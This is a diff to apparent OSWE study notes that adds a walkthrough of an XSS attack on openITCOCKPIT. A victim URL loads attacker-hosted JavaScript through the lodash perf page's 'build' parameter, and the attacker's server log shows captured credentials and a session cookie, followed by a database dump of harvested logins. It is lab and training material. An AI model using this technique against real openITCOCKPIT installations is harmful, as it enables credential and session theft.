@@ -327,3 +327,34 @@ Press CTRL+C to quit
 ```
 Note: place [api.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/api.py), [db.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/db.py) and [client.js](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/client.js) in the same directory.
 
+As a victim, visit:
+```text
+https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.45.203:80/client.js
+```
+Check your server:
+```bash
+┌──(venv)─(kali㉿kali)-[~]
+└─$ python3 api.py --host 192.168.45.203 --port 80 --cert cert.pem --key key.pem 
+Serving HTTPS on 192.168.45.203 port 80 (http://192.168.45.203:80/) ...
+ * Serving Flask app 'api'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on https://192.168.45.203:80
+Press CTRL+C to quit
+[+] Sending Payload
+192.168.45.203 - - [01/Aug/2025 18:35:16] "GET /client.js HTTP/1.1" 200 -
+[+] Received Credential: admin admin
+192.168.45.203 - - [01/Aug/2025 18:35:22] "POST /credential HTTP/1.1" 200 -
+[+] Received cookie: document.cookie CT[CTUser]=Q2FrZQ%3D%3D.bCAYcOnyK55zpjwEiRrFB7y1o2vhtYDUHDDCUrrAZZ4fbwHEBuT4mP7YB8Xiry2ObYn46dj3SDXS0bHGS73WiwsLVtVb2MG3HzxBO1zSDwKx5GR%2FlLjsx23vQih53g%3D%3D
+192.168.45.203 - - [01/Aug/2025 18:35:22] "POST /cookie HTTP/1.1" 200 -
+
+```
+You can verify the creds have been saved in the database by running:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 db.py get --credentials --all
+[(1, 'test', 'test123'), (2, 'admin', 'admin'), (3, 'admin', 'admin'), (4, 'admin', 'admin'), (5, 'admin', 'admin')]
+                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ 
+```
